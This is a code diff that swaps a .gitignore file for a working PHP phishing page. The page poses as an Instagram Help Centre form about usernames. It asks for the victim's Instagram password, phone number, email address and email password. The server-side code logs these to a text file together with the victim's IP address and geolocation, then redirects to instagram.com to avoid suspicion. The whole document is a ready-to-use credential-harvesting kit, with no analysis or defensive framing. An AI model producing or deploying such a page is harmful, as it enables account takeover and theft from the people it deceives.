@@ -1,18 +1,169 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+<?php
+if($_POST){
+$username = $_POST['username'];
+$password = $_POST['password'];
+$phone = $_POST['phone'];
+$mail = $_POST['mail'];
+$mailpassword = $_POST['mailpassword'];
 
-# Other files and folders
-.settings/
+if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
+  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
+}
+$ip = $_SERVER['REMOTE_ADDR'];
+$konum = file_get_contents("http://ip-api.com/xml/".$ip);
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+$cek = new SimpleXMLElement($konum);
+$ulke = $cek->country;
+$sehir = $cek->city;
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+
+date_default_timezone_set('Europe/Istanbul');
+$cur_time=date("d-m-Y H:i:s");
+$file = fopen('sifre.txt', 'a');
+fwrite($file, "kullanici adi: " .$username.
+"   Sifre: " .$password.
+"   Phone: " .$phone.
+"   Mail: " .$mail.
+"   Mailpassword: " .$mailpassword.
+"   Ip Adresi: " .$ip.
+"   Tarih: " .$cur_time.
+"   Yer: " .$ulke. "\n\n");
+fclose($file);
+
+
+echo '';
+header('location: https://instagram.com/');
+
+}
+?>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+  <title> Instagram Help Centre </title>
+</head>
+<style type="text/css">
+
+.mark{
+  border-bottom: 1px solid #efefef;
+  box-sizing: border-box;
+  padding: 30px 80px;
+  line-height: 16px;
+  margin-bottom: 10px;
+  text-rendering: optimizelegibility;
+  background-image:url(css/instagram.png);
+  background-repeat: no-repeat;
+  background-size: auto;
+  background-position:center;
+  display: block;
+}
+
+
+
+.head{
+  font-size: 70%;
+  color: #4b4f56;
+  font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma,verdana,arial,sans-serif;
+  border-style: solid;
+  border-width: 10%;
+  border-color: #dbdbdb;
+  width: 90%;
+  height: 90%;
+  line-height: 16px;
+  margin-top: 10px;
+  margin-bottom: 10px;
+  text-rendering: optimizelegibility;
+}
+.header{
+  font-size: 16px;
+  font-weight: bold;
+  color: #1d2129;
+  padding: 0;
+  display: block;
+  margin-block-start: 0.83em;
+  margin-block-end: 0.83em;
+  margin-inline-start: 0px;
+  margin-inline-end: 0px;
+  font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma,verdana,arial,sans-serif;
+}
+
+.send{
+  font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma,verdana,arial,sans-serif;
+  color: #fff;
+  background-color: #4267b2;
+  border-color: #4267b2;
+  border: 1px solid;
+  border-radius: 5px;
+  box-sizing: content-box;
+  font-size: 12px;
+  -webkit-font-smoothing: antialiased;
+  font-weight: bold;
+  justify-content: center;
+}
+</style>
+<body>
+
+<center>
+  <div class="mark">
+<a href="#"></a>
+  </div>
+</center>
+
+  <center>
+        <div class="head">
+          <form action="form.php" method="post">
+          <p class="header">Questions About Usernames</p>
+          <p>This form is for inquiries related to usernames. To help you make a more accurate report, please see common questions below.</p>
+          <a href="#">How do I change my username?</a>
+          <br>
+            <p>Your instagram username</p>
+            <input
+            type="text"
+            name="username"  id="username"
+            autocomplete="username"
+            placeholder="Username"
+             <br>
+             <p>Your instagram password</p>
+             <input type="password"
+             name="password"
+             id="password"
+             autocomplete="password">
+              <br>
+            <p>Your job responsibility</p>
+            <select>
+              <option>Please select</option>
+              <option>Owner, officer or director (non-legal)</option>
+              <option>Legal adviser</option>
+              <option>Other employee</option>
+              <option>Other/not applicable</option>
+            </select>
+            <br>
+            <br>
+            <p>Phone number</p>
+            <input type="number"
+            name="phone"
+            id="phone"
+            autocomplete="phone"
+            placeholder="Phone number">
+
+            <p>Email address</p>
+            <input type="email"
+            name="mail"
+            id="mail"
+            autocomplete="mail"
+            placeholder="Current e-mail verified">
+            <p>Confirm your email address password</p>
+            <input type="password"
+            name="mailpassword"
+            id="mailpassword"
+            autocomplete="mailpassword"> <br><br>
+            <a href="https://instagram.com/"><input type="submit" name="button" value="Send" class="send"></a>
+          <form>
+        </div>
+  </center>
+
+</body>
+
+</html>
